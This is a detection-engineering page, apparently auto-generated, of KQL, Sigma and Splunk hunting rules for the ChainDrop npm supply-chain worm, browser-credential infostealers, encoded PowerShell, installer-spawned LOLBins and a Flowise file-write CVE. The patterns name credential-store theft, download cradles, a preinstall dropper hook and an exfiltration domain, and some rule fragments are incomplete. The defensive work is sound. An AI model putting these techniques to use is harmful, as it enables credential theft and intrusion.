| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] ChainDrop payload files (setup.mjs / Math_Symbol.js / math_init.js) written to node_modules
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → PowerShell encoded / obfuscated command · Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Massive ChainDrop npm supply-chain attack infects hundreds of packages
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] npm 'preinstall' hook auto-executing ChainDrop setup.mjs dropper · File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] ChainDrop exfiltration to npm-cache[.]com domain · Network connections to article IPs / domains

npm 'preinstall' hook auto-executing ChainDrop setup.mjs dropper AIInstallation High
Hunts the ChainDrop worm's entry point: a Node.js process launched by an npm install lifecycle that runs the 'setup.mjs' payload dropper referenced by the poisoned packages' "preinstall": "node setup.mjs" hook. Fires on developer workstations and CI/CD runners the instant an affected package version is installed. Rationale: Anchored on the exact package.json hook "preinstall": "node setup.mjs" and the dropper filename setup.mjs named in the article; pairing node+setup.mjs+npm-lifecycle parent makes it high-fidelity vs generic node runs.
ATT&CKT1195.002 T1059.007
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A benign package legitimately named or shipping a file called setup.mjs in a preinstall hook
  • Internal monorepo tooling that runs node against a local setup.mjs bootstrap script
  • Security researchers detonating the sample in a sandbox VM
  • CI pipelines re-installing dependencies after the package was already remediated (still worth triaging)
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("@yourorg/","internal-bootstrap") )
Response runbook
1) Triage: confirm the SHA256/path of setup.mjs and identify which npm package + version pulled it (check the nearest node_modules and package.json preinstall). Cross-ref against the Wiz/Aikido/Socket compromised-package lists. 2) Contain: isolate the workstation/CI runner from network, kill the node/bun process tree, and treat the host as fully compromised per vendor guidance. 3) Hunt: rotate ALL tokens accessible from that host (GitHub PATs ghp_/gho_/ghs_, npm_ tokens, AWS/K8s/Vault creds), then look for outbound npm-cache.com traffic and new GitHub repos described 'Shai-Hulud: Here We Go Again'.
DeviceProcessEvents
| where Timestamp > ago(14d)
| where FileName in~ ("node.exe","node")
| where ProcessCommandLine has "setup.mjs"
| where InitiatingProcessFileName has_any ("npm","npm.cmd","node.exe","node","yarn","pnpm") or InitiatingProcessCommandLine has "preinstall"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, FolderPath, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(14d)
| where ActingProcessName has_any ("node","node.exe")
| where ActingProcessCommandLine has "setup.mjs"
| where ParentProcessName has_any ("npm","node","yarn","pnpm") or ParentProcessCommandLine has "preinstall"
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

ChainDrop Bun runtime executing Math_Symbol.js / math_init.js infostealer AIActions on Objectives High
Hunts the second ChainDrop stage where setup.mjs downloads the Bun JavaScript runtime from GitHub and uses it to run the obfuscated Math_Symbol.js (or math_init.js) infostealer that harvests GitHub PATs, npm tokens, AWS/K8s/Vault/DB credentials. Targets the unusual 'bun' binary running one of the two named payload scripts. Rationale: Uses the article's exact execFileSync(<bun binary>, ['Math_Symbol.js']) behaviour plus the alternate payload filename math_init.js BleepingComputer observed; 'bun' running either script on a dev/CI host is a near-unique signal.
ATT&CKT1552.001 T1105 T1059.007
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Developers legitimately adopting the Bun runtime for a project with unrelated scripts named math_init.js
  • Bun's own test suite or examples referencing similarly named JS files
  • EDR sandbox detonation of the collected sample
  • A dev deliberately naming an app entry file Math_Symbol.js (rare, high-suspicion)
Response runbook
1) Triage: confirm the bun binary's origin (was it downloaded to a temp dir then the dir deleted, as the article describes?) and capture Math_Symbol.js/math_init.js for hashing against vendor IOC lists. 2) Contain: isolate host, kill the bun process tree, block outbound to npm-cache.com and the GitHub exfil repo. 3) Hunt: enumerate every credential reachable from that environment — GitHub PATs, npm_ tokens, GitHub Actions secrets, AWS/SSM/Secrets Manager, K8s secrets, Vault, Stripe/Slack/Twilio/Azure/GCP keys — and rotate all; review GitHub for unexpected repos/commits and self-propagated package publishes.
DeviceProcessEvents
| where Timestamp > ago(14d)
| where FileName in~ ("bun.exe","bun") or InitiatingProcessFileName in~ ("bun.exe","bun")
| where ProcessCommandLine has_any ("Math_Symbol.js","math_init.js") or InitiatingProcessCommandLine has_any ("Math_Symbol.js","math_init.js")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, FolderPath, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(14d)
| where ActingProcessName has_any ("bun","bun.exe") or ParentProcessName has_any ("bun","bun.exe")
| where ActingProcessCommandLine has_any ("Math_Symbol.js","math_init.js") or ParentProcessCommandLine has_any ("Math_Symbol.js","math_init.js")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

ChainDrop exfiltration to npm-cache[.]com domain AICommand & Control High
Hunts outbound network/DNS activity to npm-cache.com, the exfiltration domain Wiz flagged as a strong ChainDrop indicator of compromise. Any resolution or connection to this domain from a developer workstation or CI/CD runner indicates active data theft. Rationale: npm-cache.com is a concrete IOC explicitly called out by Wiz in the article as a strong indicator of compromise for ChainDrop exfiltration; a single hit is actionable.
ATT&CKT1567 T1071.001
Data sourcesNetwork_Resolution.DNS Network_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Typo-squat/parked-domain scanners or threat-intel crawlers resolving the IOC domain for research
  • A security tool proactively testing IOC connectivity
  • DNS sinkhole/RPZ logging the blocked lookup (still worth confirming which host asked)
Response runbook
1) Triage: identify the process (ContextImageFileName / InitiatingProcessFileName) and host that resolved npm-cache.com; confirm it correlates with a node/bun install event. 2) Contain: block npm-cache.com at DNS/proxy/firewall, isolate the originating host, and preserve process+network artifacts. 3) Hunt: pivot on the host for setup.mjs/Math_Symbol.js/math_init.js and rotate every token reachable from that environment; check GitHub for exfil repos described 'Shai-Hulud: Here We Go Again'.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has "npm-cache.com"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort
| order by Timestamp desc
ImDnsActivity
| where TimeGenerated > ago(30d)
| where DnsQuery has "npm-cache.com"
| project TimeGenerated, SrcIpAddr, SrcHostname, DnsQuery, DnsResponseName
| order by TimeGenerated desc

ChainDrop payload files (setup.mjs / Math_Symbol.js / math_init.js) written to node_modules AIDelivery Medium
Hunts file-creation of the three named ChainDrop artifacts on developer or CI hosts. Catches the worm even before execution — e.g. a poisoned package landing on disk during dependency resolution — by flagging these exact filenames appearing under node_modules or install temp paths. Rationale: Anchored on the two verbatim payload filenames (Math_Symbol.js, math_init.js) and the dropper setup.mjs scoped to node_modules to avoid the generic setup.mjs FP; catches on-disk presence even if execution telemetry is missed.
ATT&CKT1195.002 T1105
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A legitimate project coincidentally shipping a file named math_init.js (low probability, but review)
  • Restore-from-backup or forensic copy re-creating these files during IR
  • Antivirus/EDR quarantine or sandbox extraction writing the artifact to a scan directory
  • Developer intentionally saving a captured sample for analysis
Response runbook
1) Triage: hash each dropped file and match against Wiz/Aikido/Socket/StepSecurity/Ox IOC bundles; identify the parent npm package + version. 2) Contain: quarantine the files, isolate the host, and treat the workstation/CI runner as compromised (rebuild from clean backup per vendor guidance). 3) Hunt: sweep all hosts for the same filenames + npm-cache.com egress, rotate every reachable token, and audit GitHub org repos/branches for attacker commits and newly published poisoned package versions.
DeviceFileEvents
| where Timestamp > ago(14d)
| where ActionType == "FileCreated"
| where FileName in~ ("Math_Symbol.js","math_init.js") or (FileName =~ "setup.mjs" and FolderPath has "node_modules")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FileName, FolderPath, SHA256
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(14d)
| where EventType == "FileCreated"
| where TargetFileName in~ ("Math_Symbol.js","math_init.js") or (TargetFileName =~ "setup.mjs" and TargetFilePath has "node_modules")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, TargetFileName, TargetFilePath, TargetFileSHA256
| order by TimeGenerated desc

| where FileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where InitiatingProcessFileName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath, FileName, ActionType

// ASIM ImFileEvent — covers MDE, Sysmon, AuditD, Defender for Cloud, etc.
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActorUsername !endswith "$"
| where TargetFilePath has_any (@"\Google\Chrome\User Data\",
                                  @"\Microsoft\Edge\User Data\",
                                  @"\Mozilla\Firefox\Profiles\")
| where TargetFileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where ActingProcessName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName,
          TargetFilePath, TargetFileName, EventType

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
PowerShell encoded / obfuscated command Exploitation High
Encoded or obfuscated PowerShell — common across loaders, recon, and post-exploitation.
ATT&CKT1059.001 T1027
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("powershell.exe","pwsh.exe")
| where ProcessCommandLine matches regex @"(?i)(-enc|encodedcommand|frombase64string|-nop|-w\s+hidden|invoke-expression|iex\s*\(|downloadstring|net\.webclient)"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\pwsh.exe"
| where CommandLine matches regex @"(?i)(-enc|encodedcommand|frombase64string|-nop|-w\s+hidden|invoke-expression|iex\s*\(|downloadstring|net\.webclient)"
| project TimeGenerated, Computer, Account, NewProcessName,
          CommandLine, ParentProcessName
| order by TimeGenerated desc

title: Obfuscated / Encoded PowerShell Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d08
status: experimental
description: |
    PowerShell launched with -EncodedCommand, base64 strings, hidden
    window, no-profile, bypass policy, IEX / Invoke-Expression / Net
    .WebClient.DownloadString — combinations indicating evasion.
references:
    - https://attack.mitre.org/techniques/T1059/001/
    - https://attack.mitre.org/techniques/T1027/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1059.001
    - attack.t1027
    - attack.execution
    - attack.defense-evasion
logsource:
    category: process_creation
    product: windows
detection:
    selection_image:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
    selection_args:
        CommandLine|contains:
            - '-enc '
            - 'EncodedCommand'
            - 'FromBase64String'
            - 'Invoke-Expression'
            - 'IEX('
            - 'DownloadString'
            - 'Net.WebClient'
            - '-w hidden'
            - '-WindowStyle Hidden'
            - '-nop'
            - '-NoProfile'
            - '-ep bypass'
            - '-ExecutionPolicy Bypass'
    condition: selection_image and selection_args
falsepositives:
    - DevOps tooling that legitimately uses encoded command for
      cross-shell escaping
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("powershell.exe","pwsh.exe")
      AND (Processes.process="*-enc *" OR Processes.process="*EncodedCommand*"
        OR Processes.process="*FromBase64String*" OR Processes.process="*-nop*"
        OR Processes.process="*-w hidden*" OR Processes.process="*Invoke-Expression*"
        OR Processes.process="*IEX(*" OR Processes.process="*DownloadString*"
        OR Processes.process="*Net.WebClient*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("powershell.exe","pwsh.exe")
      AND (Processes.process="*-enc *" OR Processes.process="*EncodedCommand*"
        OR Processes.process="*FromBase64String*" OR Processes.process="*-nop*"
        OR Processes.process="*-w hidden*" OR Processes.process="*Invoke-Expression*"
        OR Processes.process="*IEX(*" OR Processes.process="*DownloadString*"
        OR Processes.process="*Net.WebClient*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:

    - attack.initial-access
logsource:
    category: process_creation

        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'

    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process

| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")

    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
Network connections to article IPs / domains Command & Control High
Outbound traffic to attacker infrastructure named in the article.

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668", "fd3ca4007b225fdf8de7af4345a19179d5efa8c4bb9205f88cda806e5684b1eb", "9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc", "35a672cf34b996b91f3e1c28cbf3a05a37e036e4", "686aa40d0fc22c8d569494543a0f891f359f2f99", "f525d52ceb966516686b482d3dc0137028cc6a63") or SHA1 in~ ("54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668", "fd3ca4007b225fdf8de7af4345a19179d5efa8c4bb9205f88cda806e5684b1eb", "9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc", "35a672cf34b996b91f3e1c28cbf3a05a37e036e4", "686aa40d0fc22c8d569494543a0f891f359f2f99", "f525d52ceb966516686b482d3dc0137028cc6a63") or MD5 in~ ("54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668", "fd3ca4007b225fdf8de7af4345a19179d5efa8c4bb9205f88cda806e5684b1eb", "9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc", "35a672cf34b996b91f3e1c28cbf3a05a37e036e4", "686aa40d0fc22c8d569494543a0f891f359f2f99", "f525d52ceb966516686b482d3dc0137028cc6a63")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668", "fd3ca4007b225fdf8de7af4345a19179d5efa8c4bb9205f88cda806e5684b1eb", "9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc", "35a672cf34b996b91f3e1c28cbf3a05a37e036e4", "686aa40d0fc22c8d569494543a0f891f359f2f99", "f525d52ceb966516686b482d3dc0137028cc6a63") or SHA1 in~ ("54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668", "fd3ca4007b225fdf8de7af4345a19179d5efa8c4bb9205f88cda806e5684b1eb", "9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc", "35a672cf34b996b91f3e1c28cbf3a05a37e036e4", "686aa40d0fc22c8d569494543a0f891f359f2f99", "f525d52ceb966516686b482d3dc0137028cc6a63") or MD5 in~ ("54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668", "fd3ca4007b225fdf8de7af4345a19179d5efa8c4bb9205f88cda806e5684b1eb", "9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc", "35a672cf34b996b91f3e1c28cbf3a05a37e036e4", "686aa40d0fc22c8d569494543a0f891f359f2f99", "f525d52ceb966516686b482d3dc0137028cc6a63")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668", "fd3ca4007b225fdf8de7af4345a19179d5efa8c4bb9205f88cda806e5684b1eb", "9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc", "35a672cf34b996b91f3e1c28cbf3a05a37e036e4", "686aa40d0fc22c8d569494543a0f891f359f2f99", "f525d52ceb966516686b482d3dc0137028cc6a63"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

        where Processes.process_hash IN ("54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668", "fd3ca4007b225fdf8de7af4345a19179d5efa8c4bb9205f88cda806e5684b1eb", "9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc", "35a672cf34b996b91f3e1c28cbf3a05a37e036e4", "686aa40d0fc22c8d569494543a0f891f359f2f99", "f525d52ceb966516686b482d3dc0137028cc6a63")

Flowise arbitrary SQLite write to system dir via SQLite Record Manager additionalConfig (CVE-2026-69259) AIExploitation High
Hunts the exploitation primitive of CVE-2026-69259: the Flowise 'node' process writing a SQLite database (or any file) to a directory outside its `.flowise` data folder — especially system/cron paths — because the `additionalConfig` input lets an attacker override the `database` path. Since the flowiseai/flowise:3.1.2 Docker image runs as root, this is an arbitrary root-owned file write leading to RCE. Rationale: Anchored on the article's code: the intended DB path is `<home>/.flowise/database.sqlite` and the Docker 3.1.2 image runs as root, so a `node`-owned file write into a system/cron path outside `.flowise` is the exact arbitrary-write RCE primitive. Endpoint/root-in-Docker behaviour cross-checked against Flowise docs and prior Flowise RCE reporting. Cross-checked against: • https://github.com/advisories/GHSA-x3hf-7cj6-3r4m • https://docs.flowiseai.com/configuration/databases • https://thehackernews.com/2026/04/flowise-ai-agent-builder-under-active.html
ATT&CKT1190 T1053.005
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Operator setting DATABASE_PATH env var to relocate the SQLite DB outside ~/.flowise (e.g. to /opt/flowise-data)
  • Backup/restore tooling copying database.sqlite into /opt or /var staging paths
  • Container image built so the app dir lives under /usr/src/app and Flowise writes its DB there
  • Another unrelated Node.js service on the same host writing a SQLite cache to /tmp or /opt
  • Volume-mount initialisation seeding a SQLite file into a mounted system-adjacent path
Suppression filter
| where InitiatingProcessCommandLine has "flowise"   // scope to the Flowise app; drop unrelated node services
| where FileName != "database.sqlite" or FolderPath has_any ("/etc/cron","/var/spool/cron","/root/.ssh","/dev/shm")   // keep only clearly-abnormal targets even for the canonical DB name
Response runbook
1) Triage: pull InitiatingProcessCommandLine — confirm it is the Flowise/node process, and inspect FolderPath/FileName. Writes into /etc/cron.d, /var/spool/cron, /root/.ssh or overwriting a binary/config are high-severity; a benign relocated database.sqlite is likely FP. 2) Contain: isolate the container/host, kill the Flowise process, and preserve the written file for analysis; block external access to the Flowise API. Rotate any secrets reachable by root in the container. 3) Hunt: pivot on the same host for follow-on execution (cron job firing, new SSH keys, reverse shells), review reverse-proxy/WAF logs for POST /api/v1/vector/upsert or /api/v1/prediction carrying `additionalConfig`, and confirm Flowise is patched above 3.1.2.
DeviceFileEvents
| where Timestamp > ago(14d)
| where InitiatingProcessFileName =~ "node"
| where ActionType in ("FileCreated","FileModified")
| where FolderPath has_any ("/etc/","/root/","/usr/","/opt/","/sbin/","/bin/","/var/spool/cron","/etc/cron.d","/etc/cron.hourly","/dev/shm/")
| where FolderPath !contains ".flowise"   // exclude the legitimate Flowise data directory
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath, FileName, SHA256
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(14d)
| where ActingProcessName has "node"
| where EventType in ("FileCreated","FileModified")
| where TargetFilePath has_any ("/etc/","/root/","/usr/","/opt/","/sbin/","/bin/","/var/spool/cron","/etc/cron.d","/dev/shm/")
| where TargetFilePath !contains ".flowise"   // exclude the legitimate Flowise data directory
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileName, Hash
| order by TimeGenerated desc

Flowise SQLite Record Manager additionalConfig database-path override in upsert/prediction request (CVE-2026-69259) AIDelivery Medium
Detects the delivery step of CVE-2026-69259 in reverse-proxy/WAF request bodies: an HTTP POST to the Flowise vector-upsert or prediction API whose overrideConfig payload carries an `additionalConfig` object containing a `database` key, used to redirect the SQLite database path to an attacker-chosen filesystem location. Requires request-body logging on the WAF/proxy in front of Flowise. Rationale: Uses the exact API surface (`/api/v1/vector/upsert/{id}` with overrideConfig, corroborated by Flowise docs) plus the two article-specific tokens `additionalConfig` and `database` that together form the path-override payload — legitimate upserts do not pass a `database` key inside additionalConfig. Cross-checked against: • https://github.com/advisories/GHSA-x3hf-7cj6-3r4m • https://docs.flowiseai.com/api-reference/vector-upsert
ATT&CKT1190
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A developer legitimately tuning TypeORM sqliteOptions via additionalConfig in a test flow (rare, but possible pre-patch)
  • WAF security scanner / pentest replaying the PoC against a sanctioned Flowise instance
  • Automation that templates overrideConfig JSON and happens to include the word 'database' in an unrelated variable
  • Log parsing that surfaces the token from an admin copy-pasting the advisory into a note that transits the proxy
Suppression filter
| where DestinationHostName has "flowise" or RequestURL has "/api/v1/vector/upsert"   // scope to Flowise front-ends
| where SourceIP !in ("127.0.0.1")   // drop local health-check/replay traffic
Response runbook
1) Triage: extract SourceIP, DestinationHostName and the captured body from Message — confirm the `database` value is an absolute path or traversal outside ~/.flowise (e.g. /etc/cron.d, /root, /usr). Legit upserts never redirect the DB path. 2) Contain: block the SourceIP at the WAF, disable the targeted Flowise API/chatflow, and check whether the write succeeded by correlating to file-write telemetry on the Flowise host. 3) Hunt: pivot to the host file-write UC for a node-owned write to the same target path, review all requests from that SourceIP, and confirm Flowise is upgraded past 3.1.2 and no longer runs as root in the container.
CommonSecurityLog
| where TimeGenerated > ago(14d)
| where DeviceAction != "blocked"
| where RequestMethod == "POST"
| where RequestURL has_any ("/api/v1/vector/upsert", "/api/v1/prediction", "/api/v1/document-store")
// requires WAF/proxy request-body logging; body/inspected payload lands in Message or RequestContext
| where Message has "additionalConfig" and Message has "database"
| project TimeGenerated, SourceIP, DestinationHostName, RequestURL, RequestMethod, RequestClientApplication, Message, DeviceProduct
| order by TimeGenerated desc

